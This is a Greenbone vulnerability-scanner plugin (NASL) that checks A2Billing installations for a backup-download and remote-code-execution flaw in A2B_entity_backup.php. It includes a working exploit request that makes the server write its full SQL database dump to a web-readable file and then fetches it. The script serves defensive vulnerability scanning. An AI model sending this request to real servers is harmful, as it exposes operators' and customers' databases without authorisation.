# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:a2billing:a2billing";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107237");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2017-09-08 20:31:53 +0200 (Fri, 08 Sep 2017)");
  script_name("A2Billing Backup File Download / RCE Vulnerabilities");

  script_tag(name:"summary", value:"A2Billing is prone to backup file download and remote code
  execution (RCE) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the
  response.");

  script_tag(name:"insight", value:"The vulnerabilities are located in the
  A2B_entity_backup.php due to non proper use of MYSQLDUMP command execution on a file
  passed through the GET request.");

  script_tag(name:"impact", value:"Remote attackers are able to read the A2Billing
  database file or even pass a malicious .php file that can lead to access to a random
  system file (e.g. /etc/passwd.");

  script_tag(name:"affected", value:"All versions of A2Billing.");

  script_tag(name:"solution", value:"No known solution was made available for at least
  one year since the disclosure of this vulnerability. Likely none will be provided
  anymore. General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"https://0x4148.com/2016/10/28/a2billing-rce/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42616/");
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_a2billing_detect.nasl");
  script_mandatory_keys("a2billing/installed");
  script_require_ports("Services/www", 443);
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

rand = rand_str(length: 20, charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
url = dir + "/A2B_entity_backup.php?form_action=add&path=" + rand + ".sql";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
sleep(5);

url = dir + "/" + rand + ".sql";

if (http_vuln_check(port: port, url: url, pattern: "^(-- (MySQL|MariaDB) dump |INSERT INTO |DROP TABLE |CREATE TABLE )", check_header: TRUE)) {
  report = "It was possible to execute SQL dump remotely, the SQL dump can be accessed at " +
           http_report_vuln_url(port: port, url: url, url_only: TRUE) + ".\n\nPlease remove this file.";
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
